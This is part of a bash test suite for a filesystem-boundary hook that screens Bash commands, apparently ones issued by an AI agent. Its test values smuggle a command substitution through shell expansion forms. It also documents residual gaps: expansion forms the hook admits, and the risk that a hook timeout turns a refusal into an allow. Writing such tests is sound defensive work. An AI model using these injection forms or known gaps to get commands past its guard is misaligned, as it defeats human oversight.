xform_r_ind="$(xform_runs /bin/bash 'ref="a[$H]"; : ${!ref}')"
if [ "$xform_r_ctl" = CREATED ] && [ "$xform_r_spec" = absent ] \
   && [ "$xform_r_off" = CREATED ] && [ "$xform_r_idx" = CREATED ] && [ "$xform_r_ind" = CREATED ]; then
  /usr/bin/printf 'PASS: XFORM-RESID-04 the declared limit is real on this interpreter: offset, index and indirection each ran a command substitution carried in a value (control ran; a plain brace form did not)\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-RESID-04 the declared limit did not reproduce\n  control=%s (expected CREATED)  plain-brace=%s (expected absent)  offset=%s index=%s indirection=%s (each expected CREATED)\n' \
    "$xform_r_ctl" "$xform_r_spec" "$xform_r_off" "$xform_r_idx" "$xform_r_ind"
  FAIL=$((FAIL + 1))
fi
/usr/bin/printf 'RESIDUAL: XFORM arms pin four positions the token walk never examines and three value-re-evaluating expansion forms as ADMITTED, and two brace forms refused only by where the operand breaks. A green run here does not mean any of them is refused by a rule.\n'

# ----- XFORM-SEM-01: does the operator EXECUTE? (method b) -----
# Capability, not a version string: each candidate interpreter is asked whether it
# accepts the operator at all. The candidates are the five fixed locations the verb
# anchor already recognises — never a PATH lookup. Where none accepts it the whole
# demonstration is NOT-EVALUATED, and that line is emitted by a plain printf with no
# counter and no mode branch, so it can never read as a pass and can never gate.
xform_sem_bash=""
for xform_cand in /bin/bash /usr/bin/bash /usr/local/bin/bash /opt/homebrew/bin/bash /opt/local/bin/bash; do
  # shellcheck disable=SC2016  # program text for the child shell
  if [ -x "$xform_cand" ] && "$xform_cand" -c 'x=a; : "${x@P}"' >/dev/null 2>&1; then
    xform_sem_bash="$xform_cand"
    break
  fi
done
if [ -n "$xform_sem_bash" ]; then
  # shellcheck disable=SC2016
  xform_p_run="$(xform_runs "$xform_sem_bash" 'CFG="$H"; : ${CFG@P}')"
  # shellcheck disable=SC2016
  xform_p_ctl="$(xform_runs "$xform_sem_bash" ': $(/usr/bin/touch "$M/marker")')"
  # shellcheck disable=SC2016
  xform_p_spec="$(xform_runs "$xform_sem_bash" 'CFG="$H"; : ${CFG}')"
  # shellcheck disable=SC2016
  xform_p_ver="$("$xform_sem_bash" -c '/usr/bin/printf "%s" "$BASH_VERSION"' 2>/dev/null || echo unknown)"
  if [ "$xform_p_run" = CREATED ] && [ "$xform_p_ctl" = CREATED ] && [ "$xform_p_spec" = absent ]; then
    /usr/bin/printf 'PASS: XFORM-SEM-01 EVALUATED on %s (bash %s): the operator ran a command substitution carried in the value (control ran; a plain brace form did not)\n' "$xform_sem_bash" "$xform_p_ver"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: XFORM-SEM-01 EVALUATED on %s (bash %s): operator=%s (expected CREATED) control=%s (expected CREATED) plain-brace=%s (expected absent)\n' \
      "$xform_sem_bash" "$xform_p_ver" "$xform_p_run" "$xform_p_ctl" "$xform_p_spec"
    FAIL=$((FAIL + 1))
  fi
else
  /usr/bin/printf 'RESIDUAL: XFORM-SEM-01 NOT-EVALUATED - no bash at the five fixed locations accepts the parameter-transformation operator on this host, so the demonstration that it executes did not run; this is not a clean result. The lexical arms above do not depend on it.\n'
fi

# ----- XFORM-DOC: the readiness corpus and the hook agree, in the same run -----
# Same shape and same reason as MODEOFF-REC above: a claim in the document an operator
# reads before an enforce flip, held against the shipped hook's own verdict.
XFORM_EXPECT="REFUSED-DECLARED"

xform_claim() {   # $1 = readiness file -> REFUSED-DECLARED | ADMITTED-DECLARED | BOTH-WAYS | STALE-CLAIM | NO-DISPOSITION | NO-VALUE-LIMIT | DOC-MISSING
  if [ ! -f "$1" ]; then /usr/bin/printf 'DOC-MISSING'; return 0; fi
  /usr/bin/awk '
    index($0, "is unambiguous — an unquoted")                             { stale = 1 }
    index($0, "Parameter-transformation operators are REFUSED at G2")     { ref = 1 }
    index($0, "Parameter-transformation operators are NOT refused at G2") { adm = 1 }
    index($0, "G2 does not see a value the shell re-evaluates")           { lim = 1 }
    END {
      if (stale == 1)           { printf "STALE-CLAIM";      exit }
      if (ref == 1 && adm == 1) { printf "BOTH-WAYS";        exit }
      if (ref != 1 && adm != 1) { printf "NO-DISPOSITION";   exit }
      if (lim != 1)             { printf "NO-VALUE-LIMIT";   exit }
      if (ref == 1)             { printf "REFUSED-DECLARED"; exit }
      printf "ADMITTED-DECLARED"
    }
  ' "$1"
}

xform_observe "$HOOK_DIR" "$XFORM_C_SUBJ"
case "$XO_EXIT" in
  2) xform_behaviour="REFUSED-DECLARED" ;;
  0) xform_behaviour="ADMITTED-DECLARED" ;;
  *) xform_behaviour="UNEXPECTED-EXIT" ;;
esac
xform_frag_claim="$(xform_claim "$MODEOFF_FRAG")"
xform_index_claim="$(xform_claim "$MODEOFF_INDEX")"

if [ "$xform_frag_claim" = "$XFORM_EXPECT" ] && [ "$xform_behaviour" = "$XFORM_EXPECT" ]; then
  /usr/bin/printf 'PASS: XFORM-DOC-01 readiness SOURCE and hook agree (doc=%s, hook=%s)\n' "$xform_frag_claim" "$xform_behaviour"
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-DOC-01 readiness SOURCE and hook DISAGREE\n  doc=%s  hook=%s  (both expected %s)\n  file=%s\n' \
    "$xform_frag_claim" "$xform_behaviour" "$XFORM_EXPECT" "$MODEOFF_FRAG"
  FAIL=$((FAIL + 1))
fi

if [ "$xform_index_claim" = "$XFORM_EXPECT" ] && [ "$xform_behaviour" = "$XFORM_EXPECT" ]; then
  /usr/bin/printf 'PASS: XFORM-DOC-02 generated registry index carries the same disposition and the hook agrees\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-DOC-02 generated index claim=%s hook=%s (both expected %s) — regenerate with build-hook-registry.py\n  file=%s\n' \
    "$xform_index_claim" "$xform_behaviour" "$XFORM_EXPECT" "$MODEOFF_INDEX"
  FAIL=$((FAIL + 1))
fi

# One control per way the claim can go wrong. Each asserts the mutation is LIVE and that
# the classifier reports the specific code that mutation should produce.
xform_doc_control() {   # $1 = arm id  $2 = expected code  $3 = sed script
  local xc_mut xc_got
  xc_mut="$(/usr/bin/mktemp)"
  /usr/bin/sed "$3" "$MODEOFF_FRAG" > "$xc_mut"
  if /usr/bin/cmp -s "$MODEOFF_FRAG" "$xc_mut"; then
    /usr/bin/printf 'FAIL: %s mutation is INERT — mutant is byte-identical to the shipped document; re-point the sed\n' "$1"
    FAIL=$((FAIL + 1)); /bin/rm -f "$xc_mut"; return 0
  fi
  xc_got="$(xform_claim "$xc_mut")"
  /bin/rm -f "$xc_mut"
  if [ "$xc_got" = "$2" ]; then
    /usr/bin/printf 'PASS: %s mutation is live AND the classifier reports %s (control fires)\n' "$1" "$xc_got"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s classifier did not report the drift\n  expected=%s actual=%s\n' "$1" "$2" "$xc_got"
    FAIL=$((FAIL + 1))
  fi
}
# (a) the retired claim back in the text.
xform_doc_control "XFORM-DOC-03a" "STALE-CLAIM" \
  's|keeps its own glyphs|is unambiguous — an unquoted form keeps its own glyphs|'
# (b) the document saying the opposite of the hook.
xform_doc_control "XFORM-DOC-03b" "ADMITTED-DECLARED" \
  's|operators are REFUSED at G2|operators are NOT refused at G2|'
# (c) the value limit softened into a coverage claim.
xform_doc_control "XFORM-DOC-03c" "NO-VALUE-LIMIT" \
  's|G2 does not see a value the shell re-evaluates|G2 reads every execution surface|'

# ----- XFORM-MUT-01: a pin on a refusal must be able to go green -----
# Every G2 pin above asserts exit 2, which the shipped hook satisfies by construction. This
# arm is the class's own sensitivity control, kept beside the per-pin pairing arms: the copy
# without G2's third limb must ADMIT the subject while the shipped hook refuses it. It is
# also the hook half of XFORM-DOC-01 and -02: the same payload, through the same copy.
xform_mut_live=0
if ! /usr/bin/cmp -s "$HOOK" "${XFORM_T}/block-fs-boundary.sh"; then xform_mut_live=1; fi
xform_observe "$XFORM_T" "$XFORM_C_SUBJ"
xform_mut_exit="$XO_EXIT"
xform_observe "$HOOK_DIR" "$XFORM_C_SUBJ"
xform_now_exit="$XO_EXIT"
if [ "$xform_mut_live" = 1 ] && [ "$xform_mut_exit" = 0 ] && [ "$xform_now_exit" = 2 ]; then
  /usr/bin/printf 'PASS: XFORM-MUT-01 the copy without the third limb is live and ADMITS the subject (exit 0) while the shipped hook refuses it (exit 2): the pins can go green\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-MUT-01 mutant live=%s (expected 1)  mutant exit=%s (expected 0)  shipped exit=%s (expected 2)\n' \
    "$xform_mut_live" "$xform_mut_exit" "$xform_now_exit"
  FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$XFORM_BASE"

# ----- AC-FSB-X* (#8314, DT pass 4): the refusal message's renderer is linear -----
#
# render_token builds the message of a refusal, and the -004 advisory record, with a global pattern
# substitution of the canonicalizer's sentinel, which on bash 3.2 costs more than linear time in the
# token once the token carries one. A refusal whose operand is a large quoted token could therefore
# hold the hook past the runtime's command-hook timeout, and a hook that times out does not block:
# the refusal would become an allow. A token of at least FSB_LINEAR_MIN characters is now rewritten
# first by one sed pass in the C locale, on the line marked `# linear: render`. X-EQ lifts that line
# and the substitution after it and runs them with the bound at 0 (the pass runs) and at 10^9 (the
# substitution alone, the code before this change): equal byte for byte on a dense input — every byte
# from 1 to 255, multibyte letters, undecodable bytes and the sentinel — and on its edge endings, in
# en_US.UTF-8 and in C, alone and with the substitution, beside a near miss that must differ. X1 to
# X6 run a copy of the hook under a watchdog on a read whose one quoted operand carries structure
# throughout, at 10, 20 and 40 KB in both locales: each inside the budget and refused. X-CTL is the
# instrument's sensitivity: a copy whose bound never lets the pass run is stopped at the budget on
# a long operand in UTF-8. X-FB holds the fallback: a copy whose sed does not exist refuses a long
# operand with the shipped hook's message and raises no hook error.
FSBX_LIMIT="${FSBX_LIMIT_DS:-200}"   # tenths of a second
# fsbx_ratio <tenths> <limit> — a run's cost as a share of its budget, or "stopped" when the watchdog ended it:
# what a timed arm prints in place of a time, so no output line pairs a command's size with a time.
fsbx_ratio() { if [ "$1" = -1 ]; then /usr/bin/printf stopped; else /usr/bin/awk -v d="$1" -v l="$2" 'BEGIN { printf "%.2f", (l > 0 ? d / l : 0) }'; fi; }
FSBX_BASE="$(/usr/bin/mktemp -d)"
# fsbx_copy <name> [<sed edit>] — a sandbox copy of the hook, enforcing; prints its hooks directory.
fsbx_copy() {
  local d="${FSBX_BASE}/${1}/hooks"
  /bin/mkdir -p "$d"
  /bin/cp -R "${HOOK_DIR}/lib" "${d}/lib"
  /bin/cp "${HOOK_DIR}/../fs-boundary-allowlist.txt" "${d}/../fs-boundary-allowlist.txt"
  if [ -n "${2:-}" ]; then /usr/bin/sed -e "$2" "$HOOK" > "${d}/block-fs-boundary.sh"; else /bin/cp "$HOOK" "${d}/block-fs-boundary.sh"; fi
  /bin/chmod +x "${d}/block-fs-boundary.sh"
  /usr/bin/printf 'enforce' > "${d}/.mode"
  /usr/bin/printf '%s' "$d"
}
FSBX_S="$(fsbx_copy s)"
FSBX_NP="$(fsbx_copy np 's/^readonly FSB_LINEAR_MIN=256$/readonly FSB_LINEAR_MIN=1000000000/')"
FSBX_NT="$(fsbx_copy nt '/# linear: render$/s#/usr/bin/sed#/nonexistent/sed#')"
# The dense input, three times over, and its edge endings.
LC_ALL=C /usr/bin/awk 'BEGIN { for (r = 0; r < 3; r++) { for (i = 1; i < 256; i++) printf "%c", i
  printf "%s", "naïve 日本 ü \377\303 x\342\202 y\200 \001<quoted-expansion>\001\001 ;&|()#`<>\"'"'"'.$\\ \t\n" } }' \
  > "${FSBX_BASE}/in-0"
{ /bin/cat "${FSBX_BASE}/in-0"; /usr/bin/printf '\n'; } > "${FSBX_BASE}/in-1"
{ /bin/cat "${FSBX_BASE}/in-0"; /usr/bin/printf '\n\n\n'; } > "${FSBX_BASE}/in-2"
{ /bin/cat "${FSBX_BASE}/in-0"; /usr/bin/printf '\001'; } > "${FSBX_BASE}/in-3"
{ /bin/cat "${FSBX_BASE}/in-0"; /usr/bin/printf '.'; } > "${FSBX_BASE}/in-4"
: > "${FSBX_BASE}/in-5"
# fsbx_eval <locale> <bound> <block> <input> <out> <block|one> — the block in a fresh /bin/bash with t
# holding the input; `block` writes what the block prints, `one` (the pass line alone) prints t after.
fsbx_eval() {
  LC_ALL="$1" /bin/bash -c 'set -euo pipefail; readonly PRINTF=/usr/bin/printf CMDPOS_SENTINEL=$'"'"'\001'"'"'
    FSB_LINEAR_MIN="$1"; lp=""; t="$(/bin/cat "$3"; printf x)"; t="${t%x}"
    if [ "$5" = one ]; then . "$2"; printf "%s" "$t" > "$4"; else . "$2" > "$4"; fi' _ "$2" "$3" "$4" "$5" "$6"
}
fsbx_why=""
M='# linear: render' /usr/bin/awk 'BEGIN { m = ENVIRON["M"] }
  length($0) >= length(m) && substr($0, length($0) - length(m) + 1) == m { c++; n = 2 }
  n > 0 { print; n-- }
  END { exit c == 1 ? 0 : 1 }' "$HOOK" > "${FSBX_BASE}/block" || fsbx_why="${fsbx_why} no single line marked \`# linear: render\`;"
/usr/bin/head -1 "${FSBX_BASE}/block" > "${FSBX_BASE}/one"
F='/<quoted-expansion>/g' T='/<quoted_expansion>/g' /usr/bin/awk 'BEGIN { f = ENVIRON["F"]; t = ENVIRON["T"] }
  !d && (i = index($0, f)) { $0 = substr($0, 1, i - 1) t substr($0, i + length(f)); d = 1 }
  { print }
  END { exit d ? 0 : 1 }' "${FSBX_BASE}/block" > "${FSBX_BASE}/near" || fsbx_why="${fsbx_why} the near-miss edit did not apply;"
if [ -z "$fsbx_why" ]; then
  for fsbx_loc in en_US.UTF-8 C; do
    for fsbx_k in 0 1 2 3 4 5; do
      fsbx_eval "$fsbx_loc" 1000000000 "${FSBX_BASE}/block" "${FSBX_BASE}/in-${fsbx_k}" "${FSBX_BASE}/ship.out" block \
        || fsbx_why="${fsbx_why} [${fsbx_loc} in-${fsbx_k}] the substitution did not run;"
      fsbx_eval "$fsbx_loc" 0 "${FSBX_BASE}/block" "${FSBX_BASE}/in-${fsbx_k}" "${FSBX_BASE}/pass.out" block \
        || fsbx_why="${fsbx_why} [${fsbx_loc} in-${fsbx_k}] the pass did not run;"
      fsbx_eval "$fsbx_loc" 0 "${FSBX_BASE}/one" "${FSBX_BASE}/in-${fsbx_k}" "${FSBX_BASE}/one.out" one \
        || fsbx_why="${fsbx_why} [${fsbx_loc} in-${fsbx_k}] the pass line alone did not run;"
      /usr/bin/cmp -s "${FSBX_BASE}/ship.out" "${FSBX_BASE}/pass.out" || fsbx_why="${fsbx_why} [${fsbx_loc} in-${fsbx_k}] pass != substitution;"
      /usr/bin/cmp -s "${FSBX_BASE}/ship.out" "${FSBX_BASE}/one.out" || fsbx_why="${fsbx_why} [${fsbx_loc} in-${fsbx_k}] the pass alone != substitution;"
    done
    fsbx_eval "$fsbx_loc" 1000000000 "${FSBX_BASE}/block" "${FSBX_BASE}/in-0" "${FSBX_BASE}/ship.out" block || fsbx_why="${fsbx_why} [${fsbx_loc}] the reference did not run;"
    fsbx_eval "$fsbx_loc" 0 "${FSBX_BASE}/near" "${FSBX_BASE}/in-0" "${FSBX_BASE}/near.out" block || fsbx_why="${fsbx_why} [${fsbx_loc}] the near miss did not run;"
    [ -s "${FSBX_BASE}/ship.out" ] || fsbx_why="${fsbx_why} [${fsbx_loc}] empty reference output;"
    /usr/bin/cmp -s "${FSBX_BASE}/ship.out" "${FSBX_BASE}/near.out" \
      && fsbx_why="${fsbx_why} [${fsbx_loc}] the near miss equals the substitution (the comparison cannot see a difference);"
  done
fi
if [ -z "$fsbx_why" ]; then
  /usr/bin/printf 'PASS: %s\n' "AC-FSB-X-EQ: the \`# linear: render\` pass equals the substitution byte for byte on a dense input and its edge endings in UTF-8 and C, alone and with it, and a near miss differs"; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: %s\n  %s\n' "AC-FSB-X-EQ: the \`# linear: render\` pass equals the substitution byte for byte" "$fsbx_why"; FAIL=$((FAIL + 1))
fi
# fsbx_fill <bytes> <head> <unit> <tail> — the head, as many units as fit, then the tail.
fsbx_fill() {
  H="$2" U="$3" T="$4" /usr/bin/awk -v n="$1" 'BEGIN { h = ENVIRON["H"]; u = ENVIRON["U"]; t = ENVIRON["T"]; s = h
    while (length(s) + length(u) + length(t) <= n) s = s u
    printf "%s", s t }'
}
# fsbx_reap <pid> — stop a process and every process under it, children first, with KILL.
fsbx_reap() {
  local c
  for c in $(/usr/bin/pgrep -P "$1" 2>/dev/null); do fsbx_reap "$c"; done
  kill -9 "$1" 2>/dev/null
}
# fsbx_timed <hooks-dir> <locale> <command-file> <limit> — the hook on the Bash payload of the command
# under a watchdog; sets FSBX_DS (tenths elapsed, -1 when stopped) and FSBX_EXIT.
FSBX_DS=0
FSBX_EXIT=0
fsbx_timed() {
  local pay="${FSBX_BASE}/payload.json" pid n=0
  bash_payload "$(/bin/cat "$3")" "$FSBX_BASE" > "$pay"
  LC_ALL="$2" /bin/bash "$1/block-fs-boundary.sh" < "$pay" > /dev/null 2>&1 &
  pid=$!
  while kill -0 "$pid" 2>/dev/null; do
    if [ "$n" -ge "$4" ]; then
      fsbx_reap "$pid"; wait "$pid" 2>/dev/null
      FSBX_DS=-1; FSBX_EXIT=-1; return 0
    fi
    /bin/sleep 0.1; n=$(( n + 1 ))
  done
  FSBX_EXIT=0; wait "$pid" || FSBX_EXIT=$?
  FSBX_DS="$n"
}
for fsbx_kb in 10 20 40; do fsbx_fill $(( fsbx_kb * 1024 )) 'cat "' 'a;b|c&d(e)f' '"' > "${FSBX_BASE}/token-${fsbx_kb}.cmd"; done
fsbx_n=0
for fsbx_loc in en_US.UTF-8 C; do
  for fsbx_kb in 10 20 40; do
    fsbx_n=$(( fsbx_n + 1 ))
    fsbx_timed "$FSBX_S" "$fsbx_loc" "${FSBX_BASE}/token-${fsbx_kb}.cmd" "$FSBX_LIMIT"
    if [ "$FSBX_DS" != -1 ] && [ "$FSBX_EXIT" = 2 ]; then
      /usr/bin/printf 'PASS: %s\n' "AC-FSB-X${fsbx_n}: a read of a ${fsbx_kb} KB quoted operand carrying structure throughout, in ${fsbx_loc}, is refused within the budget"; PASS=$((PASS + 1))
    else
      /usr/bin/printf 'FAIL: %s\n  %s\n' "AC-FSB-X${fsbx_n}: a read of a long quoted operand carrying structure throughout, in ${fsbx_loc}, is refused inside the budget — measured ratio $(fsbx_ratio "${FSBX_DS}" "${FSBX_LIMIT}") of the budget, bound 1.00" \
        "\"stopped\" is the watchdog ending the run at the budget; exit=${FSBX_EXIT} (want 2)"; FAIL=$((FAIL + 1))
    fi
  done
done
fsbx_timed "$FSBX_NP" en_US.UTF-8 "${FSBX_BASE}/token-20.cmd" "$FSBX_LIMIT"
if [ "$FSBX_DS" = -1 ] && /usr/bin/grep -q -F -x 'readonly FSB_LINEAR_MIN=1000000000' "${FSBX_NP}/block-fs-boundary.sh"; then
  /usr/bin/printf 'PASS: %s\n' "AC-FSB-X-CTL: a copy whose bound never lets the pass run is stopped at the budget on a long operand in UTF-8 — the instrument sees the cost"; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: %s\n  %s\n' "AC-FSB-X-CTL: a copy whose bound never lets the pass run is stopped at the budget — measured ratio $(fsbx_ratio "${FSBX_DS}" "${FSBX_LIMIT}") of the budget, bound 1.00" \
    "exit=${FSBX_EXIT}; a copy that finishes, or that carries no raised bound, cannot show X1-X6 measure anything (BROKEN PROBE)"; FAIL=$((FAIL + 1))
fi
# X-FB: the pass's sed repointed to a path that does not exist, so the pass fails and the substitution
# renders the token; a read of a 400-byte quoted operand carrying structure is refused alike.
fsbx_why=""
fsbx_tools="$(/usr/bin/grep -c -F '/nonexistent/sed' "${FSBX_NT}/block-fs-boundary.sh")" || true
[ "$fsbx_tools" = 1 ] || fsbx_why="${fsbx_why} the copy repoints ${fsbx_tools} pass lines, want 1;"
fsbx_cmd="$(fsbx_fill 400 'cat "' 'a;b|c&d(e)f' '"')"
fsbx_s=0; fsbx_t=0
fsbx_es="$( { /usr/bin/printf '%s' "$(bash_payload "$fsbx_cmd" "$FSBX_BASE")" | /bin/bash "${FSBX_S}/block-fs-boundary.sh" > /dev/null; } 2>&1 )" || fsbx_s="$?"
fsbx_et="$( { /usr/bin/printf '%s' "$(bash_payload "$fsbx_cmd" "$FSBX_BASE")" | /bin/bash "${FSBX_NT}/block-fs-boundary.sh" > /dev/null; } 2>&1 )" || fsbx_t="$?"
[ "$fsbx_s" = 2 ] || fsbx_why="${fsbx_why} the shipped hook exits ${fsbx_s}, want 2;"
[ "$fsbx_t" = "$fsbx_s" ] || fsbx_why="${fsbx_why} the copy without its sed exits ${fsbx_t}, the shipped hook ${fsbx_s};"
case "$fsbx_et" in *HOOK-ERROR*) fsbx_why="${fsbx_why} the copy without its sed raised a hook error;" ;; esac
fsbx_ms="$(/usr/bin/grep -F 'BLOCK-FS-BOUNDARY-003' <<< "$fsbx_es")" || true
fsbx_mt="$(/usr/bin/grep -F 'BLOCK-FS-BOUNDARY-003' <<< "$fsbx_et")" || true
case "$fsbx_ms" in *'<quoted-expansion>b<quoted-expansion>c'*) ;; *) fsbx_why="${fsbx_why} the shipped refusal renders no sentinel;" ;; esac
[ "$fsbx_mt" = "$fsbx_ms" ] || fsbx_why="${fsbx_why} the copy without its sed words the refusal differently;"
if [ -z "$fsbx_why" ]; then
  /usr/bin/printf 'PASS: %s\n' "AC-FSB-X-FB: with the pass's sed missing, the substitution renders the token — a long operand is refused with the shipped hook's message, with no hook error"; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: %s\n  %s\n' "AC-FSB-X-FB: with the pass's sed missing, the refusal equals the shipped hook's" "$fsbx_why"; FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$FSBX_BASE"

# ----- AC-CPH-F* (#8314, DT pass 7): the hook clears the canonicalizer's long shapes inside the budget -----
#
# The shared canonicalizer's three changed sites — the basename step of a prefix word, the option-cluster
# walk and the split-string scan — each read their token once, so this hook, which canonicalizes every Bash
# command, clears one long command word, a long option cluster and a long split string in its short and
# long spelling inside the budget at 10, 20, 40 and 80 KB in en_US.UTF-8 and C, and allows each. The arms
# that see each site's cost apart from the rest of the hook are the false-positive control's AC-CP-L arms,
# on the canonicalizer alone, beside their sensitivity copy.
FSBC_LIMIT="${FSBC_LIMIT_DS:-200}"   # tenths of a second
# fsbc_ratio <tenths> <limit> — a run's cost as a share of its budget, or "stopped" when the watchdog ended it:
# what a timed arm prints in place of a time, so no output line pairs a command's size with a time.
fsbc_ratio() { if [ "$1" = -1 ]; then /usr/bin/printf stopped; else /usr/bin/awk -v d="$1" -v l="$2" 'BEGIN { printf "%.2f", (l > 0 ? d / l : 0) }'; fi; }
FSBC_BASE="$(/usr/bin/mktemp -d)"
FSBC_D="${FSBC_BASE}/s/hooks"
/bin/mkdir -p "$FSBC_D"
/bin/cp -R "${HOOK_DIR}/lib" "${FSBC_D}/lib"
/bin/cp "${HOOK_DIR}/../fs-boundary-allowlist.txt" "${FSBC_D}/../fs-boundary-allowlist.txt"
/bin/cp "$HOOK" "${FSBC_D}/block-fs-boundary.sh"
/bin/chmod +x "${FSBC_D}/block-fs-boundary.sh"
/usr/bin/printf 'enforce' > "${FSBC_D}/.mode"
# fsbc_cmd <shape> <bytes> <file> — the head, as many units as fit, then the tail, built by doubling.
fsbc_cmd() {
  local h u t
  case "$1" in
    word)    h='';                     u='a'; t='' ;;
    cluster) h='sudo -';               u='b'; t=' q' ;;
    split)   h='env -S-';              u='b'; t=' q' ;;
    lsplit)  h='env --split-string=-'; u='b'; t=' q' ;;
  esac
  H="$h" U="$u" T="$t" LC_ALL=C /usr/bin/awk -v n="$2" 'BEGIN { h = ENVIRON["H"]; u = ENVIRON["U"]; t = ENVIRON["T"]
    m = n - length(h) - length(t); r = u; while (length(r) < m) r = r r
    printf "%s", h substr(r, 1, m) t }' > "$3"
}
# fsbc_reap <pid> — stop a process and every process under it, children first, with KILL.
fsbc_reap() {
  local c
  for c in $(/usr/bin/pgrep -P "$1" 2>/dev/null); do fsbc_reap "$c"; done
  kill -9 "$1" 2>/dev/null
}
# fsbc_timed <locale> <command-file> <limit> — the hook on the Bash payload of the command under a
# watchdog; sets FSBC_DS (tenths elapsed, -1 when stopped) and FSBC_EXIT.
FSBC_DS=0
FSBC_EXIT=0
fsbc_timed() {
  local pay="${FSBC_BASE}/payload.json" pid n=0
  bash_payload "$(/bin/cat "$2")" "$FSBC_BASE" > "$pay"
  LC_ALL="$1" /bin/bash "${FSBC_D}/block-fs-boundary.sh" < "$pay" > /dev/null 2>&1 &
  pid=$!
  while kill -0 "$pid" 2>/dev/null; do
    if [ "$n" -ge "$3" ]; then
      fsbc_reap "$pid"; wait "$pid" 2>/dev/null
      FSBC_DS=-1; FSBC_EXIT=-1; return 0
    fi
    /bin/sleep 0.1; n=$(( n + 1 ))
  done
  FSBC_EXIT=0; wait "$pid" || FSBC_EXIT=$?
  FSBC_DS="$n"
}
fsbc_n=0
for fsbc_shape in word cluster split lsplit; do
  for fsbc_kb in 10 20 40 80; do fsbc_cmd "$fsbc_shape" $(( fsbc_kb * 1024 )) "${FSBC_BASE}/${fsbc_shape}-${fsbc_kb}.cmd"; done
  for fsbc_loc in en_US.UTF-8 C; do
    for fsbc_kb in 10 20 40 80; do
      fsbc_n=$(( fsbc_n + 1 ))
      fsbc_timed "$fsbc_loc" "${FSBC_BASE}/${fsbc_shape}-${fsbc_kb}.cmd" "$FSBC_LIMIT"
      if [ "$FSBC_DS" != -1 ] && [ "$FSBC_EXIT" = 0 ]; then
        /usr/bin/printf 'PASS: %s\n' "AC-CPH-F${fsbc_n}: the long ${fsbc_shape} shape at ${fsbc_kb} KB in ${fsbc_loc} clears the hook within the budget and is allowed"; PASS=$((PASS + 1))
      else
        /usr/bin/printf 'FAIL: %s\n  %s\n' "AC-CPH-F${fsbc_n}: the long ${fsbc_shape} shape in ${fsbc_loc} clears the hook inside the budget and is allowed — measured ratio $(fsbc_ratio "${FSBC_DS}" "${FSBC_LIMIT}") of the budget, bound 1.00" \
          "\"stopped\" is the watchdog ending the run at the budget; exit=${FSBC_EXIT} (want 0)"; FAIL=$((FAIL + 1))
      fi
    done
  done
done
/bin/rm -rf "$FSBC_BASE"

# ----- Summary -----

echo ""
echo "================================"
TOTAL=$((PASS + FAIL))
/usr/bin/printf 'Total: %s  PASS: %s  FAIL: %s\n' "$TOTAL" "$PASS" "$FAIL"
echo "================================"

if [ "$FAIL" -gt 0 ]; then exit 1; fi
exit 0
